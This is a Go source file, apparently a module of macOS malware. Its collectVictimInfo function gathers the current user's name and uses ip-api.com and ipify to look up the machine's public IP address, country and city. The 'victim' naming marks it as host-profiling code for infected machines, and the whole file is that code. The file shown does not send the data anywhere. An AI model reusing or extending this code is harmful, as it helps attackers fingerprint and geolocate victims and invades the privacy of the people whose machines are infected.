package main

import (
	"encoding/json"
	"io"
	"net/http"
	"os/user"
	"strings"
	"time"
)

const victimInfoTimeout = 6 * time.Second

func collectVictimInfo() (publicIP, country, countryCode, city, macUser string) {
	if u, err := user.Current(); err == nil {
		macUser = strings.TrimSpace(u.Username)
	}

	publicIP, country, countryCode, city = fetchPublicGeo()
	if publicIP == "" {
		publicIP = fetchPublicIPOnly()
	}
	return publicIP, country, countryCode, city, macUser
}

func fetchPublicGeo() (ip, country, countryCode, city string) {
	client := &http.Client{Timeout: victimInfoTimeout}
	req, err := http.NewRequest(http.MethodGet, "http://ip-api.com/json/?fields=status,query,country,countryCode,city", nil)
	if err != nil {
		return "", "", "", ""
	}

	resp, err := client.Do(req)
	if err != nil {
		return "", "", "", ""
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if err != nil {
		return "", "", "", ""
	}

	var data struct {
		Status      string `json:"status"`
		Query       string `json:"query"`
		Country     string `json:"country"`
		CountryCode string `json:"countryCode"`
		City        string `json:"city"`
	}
	if json.Unmarshal(body, &data) != nil || data.Status != "success" {
		return "", "", "", ""
	}

	return strings.TrimSpace(data.Query), strings.TrimSpace(data.Country),
		strings.TrimSpace(data.CountryCode), strings.TrimSpace(data.City)
}

func fetchPublicIPOnly() string {
	client := &http.Client{Timeout: victimInfoTimeout}
	resp, err := client.Get("https://api.ipify.org?format=text")
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 64))
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(body))
}